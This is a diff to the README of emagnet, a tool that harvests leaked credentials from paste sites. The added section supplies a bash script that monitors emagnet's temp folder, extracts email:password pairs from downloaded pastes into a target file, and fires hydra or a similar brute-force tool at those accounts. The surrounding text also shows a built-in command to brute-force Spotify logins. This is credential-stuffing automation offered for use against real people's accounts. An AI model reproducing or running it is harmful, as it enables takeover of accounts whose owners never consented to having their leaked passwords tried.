@@ -112,6 +112,40 @@ If you have two providers or even three as I do, just do exactly as above then b
 
       bash emagnet --bruteforce spotify
 
+### I wanna use hydra with the email and passwords that I have found while it's running, how can I do this? 
+##### Here is an example, mod it after your needs
+
+    cat > my-bruteforce-tool.sh <<EOF
+ 
+    #!/bin/bash                               
+    # inotify-tools is required for this sample
+    
+    # Where emagnet.conf is stored so you can read folders
+    source /path/to/emagnet.conf                          
+
+    # Where to place email + passwords we have found wich will be our target
+    HYDRA_TARGETS="/tmp/.emagnet-hydra-targets.txt"          
+
+    # When something happens in emagnet's temp folder  
+    # then search for email+password combos and if something is found
+    # then your command will be triggered and attack the targets.
+    while inotifywait -e modify $EMAGNETTEMP; do
+    PASTEBIN_TARGETS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'| \
+         cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v '/' > $HYDRA_TARGETS)
+
+        # If the target file is empty, then we monitor the dir again
+        # until emagnet download new files otherwise use the prefered tool and attack your targets 
+          if [[ -s $HYDRA_TARGETS -gt "0" ]]; then
+             <add your hydra or prefered tool here>
+          fi
+     done
+    EOF
+ 
+    chmod +x my-bruteforce-tool.sh
+    ./my-bruteforce-tool.sh
+
+### Now just run emagnet and your patience is the key to success! :-)
+ 
 ### Wiki Sections:
 
 - [About](https://github.com/wuseman/EMAGNET/wiki/ABOUT) - 
